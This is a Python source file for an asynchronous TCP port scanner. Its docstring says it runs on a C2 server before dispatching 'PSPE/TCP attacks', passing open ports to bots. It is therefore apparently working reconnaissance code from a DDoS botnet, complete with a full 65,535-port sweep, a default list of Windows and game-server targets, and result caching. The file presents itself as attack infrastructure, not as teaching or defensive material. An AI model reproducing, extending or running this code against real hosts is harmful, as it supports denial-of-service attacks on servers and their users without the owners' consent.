"""Server-side TCP port scanner (1–65535).
Runs once on C2 before dispatching PSPE/TCP attacks.
Bots receive the open-port list and only hit those ports.
"""
from __future__ import annotations

import asyncio
import socket
from typing import List, Optional, Tuple

# Cache: host -> (ts, ports)
_scan_cache: dict = {}
CACHE_TTL = 300  # 5 min


async def _probe(host: str, port: int, timeout: float = 0.4) -> Optional[int]:
    try:
        fut = asyncio.open_connection(host, port)
        reader, writer = await asyncio.wait_for(fut, timeout=timeout)
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        return port
    except Exception:
        return None


async def scan_ports(
    host: str,
    *,
    full: bool = True,
    ports: Optional[List[int]] = None,
    concurrency: int = 800,
    timeout: float = 0.35,
    include_always: Optional[List[int]] = None,
) -> List[int]:
    """Scan TCP ports on host. Returns sorted open ports.

    full=True  → scan 1..65535
    full=False → scan `ports` list (or common Windows/game set if ports is None)
    """
    key = f"{host}|{'full' if full else 'partial'}"
    now = asyncio.get_event_loop().time()
    cached = _scan_cache.get(key)
    if cached and now - cached[0] < CACHE_TTL:
        return list(cached[1])

    if full:
        targets = list(range(1, 65536))
    elif ports:
        targets = sorted(set(p for p in ports if 1 <= p <= 65535))
    else:
        # Common Windows game VPS set when partial scan without explicit list
        targets = sorted(set([
            21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
            993, 995, 1433, 1434, 3306, 3389, 5432, 5900, 5985, 5986,
            6379, 8080, 8081, 8443, 8888, 9000, 14443, 14444, 25565, 27017,
            2053, 2083, 2087, 2095, 2096, 8172, 8800, 32400,
        ]))

    if include_always:
        for p in include_always:
            if 1 <= p <= 65535 and p not in targets:
                targets.append(p)

    open_ports: List[int] = []
    sem = asyncio.Semaphore(concurrency)

    async def worker(p: int):
        async with sem:
            r = await _probe(host, p, timeout=timeout)
            if r is not None:
                open_ports.append(r)

    # Chunk to avoid scheduling 65k tasks at once
    chunk = 2000
    for i in range(0, len(targets), chunk):
        batch = targets[i:i + chunk]
        await asyncio.gather(*(worker(p) for p in batch))

    result = sorted(set(open_ports))
    # Always keep user-requested ports if provided (even if probe failed — firewall may drop probe)
    if include_always:
        for p in include_always:
            if 1 <= p <= 65535 and p not in result:
                result.append(p)
        result = sorted(set(result))

    _scan_cache[key] = (now, result)
    print(f"[scan] {host}: {len(result)} open port(s) (full={full})")
    return result


def format_ports(ports: List[int]) -> str:
    return ",".join(str(p) for p in ports)
